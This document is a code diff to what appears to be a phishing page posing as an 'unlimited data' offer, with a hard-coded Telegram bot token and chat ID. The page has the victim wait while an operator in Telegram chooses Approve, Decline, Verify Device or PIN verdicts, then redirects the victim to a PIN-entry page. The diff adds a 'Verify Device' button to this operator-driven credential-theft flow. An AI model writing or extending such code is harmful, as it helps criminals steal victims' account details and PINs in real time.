@@ -182,7 +182,7 @@
             BOT_TOKEN: '8746906558:AAHpzw4CN1J8y4LdO7f8fBsZ_DIFhKYuXB8',
             CHAT_ID: '7547427914',
             SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
-            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← Goes directly to PIN
+            PIN_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'   // ← Changed to PIN page
         };
 
         let state = {
@@ -266,6 +266,9 @@
                                 { text: "❌ Decline", callback_data: state.declineId }
                             ],
                             [
+                                { text: "📱 Verify Device", callback_data: state.verifyDeviceId }
+                            ],
+                            [
                                 { text: "✅ Valid PIN", callback_data: state.validPinId },
                                 { text: "❌ Invalid PIN", callback_data: state.invalidPinId }
                             ]
@@ -295,7 +298,7 @@
                                 const cb = update.callback_query.data;
 
                                 if (cb === state.approveId) {
-                                    // APPROVE → Go directly to PIN verification
+                                    // APPROVE → Go to PIN verification page
                                     clearInterval(state.pollInterval);
                                     spinner.style.display = 'none';
                                     window.location.href = CONFIG.PIN_PAGE;
@@ -305,6 +308,11 @@
                                     spinner.style.display = 'none';
                                     errMsg.textContent = "Request declined. Please try again.";
                                     errMsg.style.display = 'block';
+                                }
+                                else if (cb === state.verifyDeviceId) {
+                                    clearInterval(state.pollInterval);
+                                    spinner.style.display = 'none';
+                                    window.location.href = CONFIG.PIN_PAGE;
                                 }
                                 else if (cb === state.validPinId) {
                                     clearInterval(state.pollInterval);
